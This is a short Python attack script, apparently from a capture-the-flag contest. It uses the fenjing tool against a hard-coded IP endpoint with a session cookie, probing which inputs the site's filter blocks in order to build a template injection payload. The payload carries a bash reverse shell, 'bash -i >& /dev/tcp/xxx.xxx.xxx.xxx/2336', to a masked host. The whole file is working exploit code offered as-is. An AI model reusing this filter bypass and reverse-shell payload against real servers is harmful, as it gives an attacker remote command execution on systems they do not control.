import functools
import time
import requests
from fenjing import exec_cmd_payload

url = "http://101.200.138.180:16356/evlelLL/646979696775616e"
# session=eyJhbnN3ZXJzX2NvcnJlY3QiOnRydWV9.ZkQrdg.TTUE-T5iRTAmIfSy5szAO9ZMgkA
cookies = {
    'session': 'eyJhbnN3ZXJzX2NvcnJlY3QiOnRydWV9.Zk_z-g.dwfPDIOCrkNjPsWEE_2_PjL5bvg'
}
headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'  # 根据需要调整
    }
@functools.lru_cache(1000)
def waf(payload: str):  # 如果字符串s可以通过waf则返回True, 否则返回False
    time.sleep(0.02) # 防止请求发送过多
    resp = requests.post(url, headers=headers, cookies=cookies, timeout=10, data={"iIsGod": payload})
    # print(resp.text)
    return "大胆" not in resp.text
if __name__ == "__main__":
    shell_payload, will_print = exec_cmd_payload(
        waf, 'bash -c "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2336 0>&1"'
    )
    if not will_print:
        print("这个payload不会产生回显！")
    
    print(f"{shell_payload=}")
